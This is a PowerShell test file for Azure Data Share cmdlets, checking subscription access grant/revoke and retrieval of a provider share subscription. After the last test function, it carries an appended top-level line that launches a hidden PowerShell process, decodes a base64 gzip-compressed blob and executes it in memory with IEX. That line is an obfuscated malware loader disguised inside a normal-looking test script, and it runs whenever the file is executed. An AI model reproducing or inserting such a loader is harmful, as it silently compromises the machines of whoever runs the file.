﻿














function Test-ProviderShareSubscriptionGrantAndRevoke
{
    $resourceGroup = getAssetName
    $AccountName = getAssetName
    $ShareName = getAssetName
    $ShareSubId = getAssetName
	$resourceId = getAssetName

	$revoked = Revoke-AzDataShareSubscriptionAccess -ResourceGroupName $resourceGroup -AccountName $AccountName -ShareName $ShareName -ShareSubscriptionId $ShareSubId
	Assert-NotNull $revoked

	$revoked = Revoke-AzDataShareSubscriptionAccess -ResourceId $resourceId -ShareSubscriptionId $ShareSubId
	Assert-NotNull $revoked

	$reinstated = Grant-AzDataShareSubscriptionAccess -ResourceGroupName $resourceGroup -AccountName $AccountName -ShareName $ShareName -ShareSubscriptionId $ShareSubId
	Assert-NotNull $reinstated
	
	$reinstated = Grant-AzDataShareSubscriptionAccess -ResourceId $resourceId -ShareSubscriptionId $ShareSubId
	Assert-NotNull $reinstated
}

function Test-ProviderShareSubscriptionGet
{
    $resourceGroup = getAssetName
    $AccountName = getAssetName
    $ShareName = getAssetName
    $ShareSubscriptionId = getAssetName

    $retrievedProviderShareSubscription = Get-AzDataShareProviderShareSubscription -AccountName $AccountName -ResourceGroupName $resourceGroup -ShareName $ShareName -ShareSubscriptionId $ShareSubscriptionId
 	$shareSubscriptionName = "sdktestingprovidersharesubscription20"

    Assert-NotNull $retrievedProviderShareSubscription
    Assert-AreEqual $shareSubscriptionName $retrievedProviderShareSubscription.Name
    Assert-AreEqual $ShareSubscriptionId $retrievedProviderShareSubscription.ShareSubscriptionObjectId
    Assert-AreEqual "Active" $retrievedProviderShareSubscription.ShareSubscriptionStatus
    Assert-AreEqual "Microsoft" $retrievedProviderShareSubscription.Company
}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIACyVG1gCA71WbW/aSBD+3Er9D1aFZFsl2CQ0SSNVujXmxQkQiIMJcOi0sddmYe0l9joBev3vNwY7pWpyyvXDWSDvy8zszDPP7NhPI1dQHkmP9L6qf67T1NpI3z68f9fHMQ4lpUT1TlkqrS8fztvqu3ewUVrUrWqLSF8lZYpWK5OHmEazi4t6GsckEvt5pUUEShIS3jNKEkWV/pZGcxKTo+v7BXGF9E0q/VVpMX6PWS62qWN3TqQjFHnZXoe7OPOrYq8YFYr855+yOj2qziqNhxSzRJHtTSJIWPEYk1Xpu5odeLtZEUXuUjfmCfdFZUSjk+PKMEqwT3pg7ZF0iZhzL5FViAN+MRFpHEl5RJmJvYAiw7Afcxd5XkwSkK9Y0SNfEqUUpYyVpT+UaX7+TRoJGhLYFyTmK5vEj9QlSaWNI4+RG+LPlB55KsJ+q5JyqARSfRGrZUjGi452uZcysteV1V9dzVKowvOcRoj++4f3H977Re6D0Kmh+9PDvMPo3XQ3JuCj0ucJ3Yl+lfSy1IWzsODxBqal2zgl6kyaZuhPZzOpRO7PxIM1vi2/bqNaKGTioQ8rU4dTbwYaeWpKSzwJe9vzzel1tvs60Uzi04iYmwiH1C24pLwEOvEZ2cVbKcR64Jki5xvEMwkjARYZiGVp+qtaI6TiWddIKfNIjFxIXAJeQU7Vn53Z50WRrahLQgBrP5chDT4wmBTSOWs3xenZHITkOsNJUpb6KZSQW5ZsghnxyhKKEppvoVTw3VD+4W43ZYK6OBGFuZn6M5r5qXUeJSJOXcgiIHBrr4hLMcsAKUtt6hFjY9OgOF1+EY46ZoxGAVh6hHTASgaDLTJuxODoMw/Uik2EFa4YCUFuV9VNhgOo4bwOdoTCAfHkl30tuL4ndoZNAcqBp5Bwm3FRlhwaC7giMpyBWr/vx8H9cOBRPSZ5jpSijKbGRmTML8W9uJ2RNYdqB0wsAJRmzEMDJ+S0ZosYIFM+ate0juAZWxHrusaSVtETrVpd+A/picXNM+/qctHWYnM995GVWN123xy027XHS9upCbthiau+JbqNu8XCRu2b4VhMLNS+pfpyXNuuLunW7iBvvNZOt8b2STfW20Xg+WPT94Mz376pfm7Szqg+MPRj3DEbaWdkPBl6LWnQp/aADgfLy6a4HzsMD30tuKt+wXTdiRdOlXe3FkKt+Ym7vfSd1rzrbcZt7cuotkQNhOpRw2ka/GpsxKivOThw+NNVYKAwgFivMCWTwbBpDAZNAw1biwfzixaA7h2eGyPnmE5WdzdzmDfBhStNr1ke2fLxAEBqcYSDG5AJ6sfu3AcZ8xMyPvV4coyXBkcGyDQnD+DXeNXsM9i/HR5z5LDeHUadyaapadVxv4baOh21ApSZxIExwCh5NLemVnU87o0+98a+5tyxM82s365cX9O0p7Z55U6q6/Prs/POiDohR0NNcz5m7AB6lETYPDnI92u3ehfHyRwz4AFc1kVZNnnczK/fPqeZhqIctuAliSPCoH1BgysojRjjbtYHivsa2tC+OcygQIcwPDl+caRKz4LqjwZRLF1cTMBfKJSMv5UOiQIxL+vrE12Hq15f13SI9+0x1vlqo+xMlbNWsQOpsM12ttWsaEopMoNT53+BL6/ZOby8N8D3Y+1fdt8EqV7eh//L8s8L/wnf3wVhhKkABRuuH0b2nfFVLHLWHHxL7LMFrPDzJ/uiu07FUQ8+Mv4ByLOxqEQKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

